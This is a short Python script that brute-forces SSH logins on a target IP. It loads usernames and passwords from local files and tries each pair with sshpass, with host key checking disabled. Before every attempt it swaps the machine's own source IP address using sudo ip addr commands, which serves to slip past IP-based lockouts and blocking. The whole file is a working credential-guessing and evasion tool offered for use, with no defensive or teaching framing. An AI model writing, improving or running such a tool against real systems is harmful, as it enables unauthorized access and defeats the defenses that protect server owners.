import subprocess

def set_Values():
    global target_IP
    target_IP = str(input("Please enter the Target IP: "))
    global network_Interface
    network_Interface = str(input("Please enter the Network Interface: "))
    global host_IP
    host_IP = str(input("Please enter the Source IP: "))


def format_SourceIP():
    global source_IP
    source_IPs = host_IP.split('.')
    source_IP = source_IPs[:-1]
    source_IP = '.'.join(source_IP)
    source_IP = source_IP + '.'

def make_IP_List():
    global ips
    ips = []
    for i in range(52, 254):
        ips.append(i)

def get_Passwords():
    global passwds
    passwds = []
    with open('./passwordfile.txt', 'r') as file1:
        passwds = [line.strip() for line in file1]

def get_Users():
    global users
    users = []
    with open('./userfile.txt', 'r') as file1:
        users = [line.strip() for line in file1]

def run_Attack():
    ip_index = 0
    passwd_index = 0
    subprocess.call(['sudo', 'ip', 'addr', 'delete', host_IP + '/24', 'dev', network_Interface])
    while passwd_index < len(passwds):
        for user in users:
            for ps in passwds:
                print(user,':', ps)
                ip = ips[ip_index]
                old_ip = ip - 1
                subprocess.call(['sudo', 'ip', 'addr', 'add', source_IP + str(ip) + '/24', 'dev', network_Interface])
                subprocess.call(['sudo', 'ip', 'addr', 'delete', source_IP + str(old_ip) + '/24', 'dev', network_Interface])
                subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + target_IP])
                ip_index += 1
                if ip_index >= len(ips):
                    ip_index = 0
                passwd_index += 1      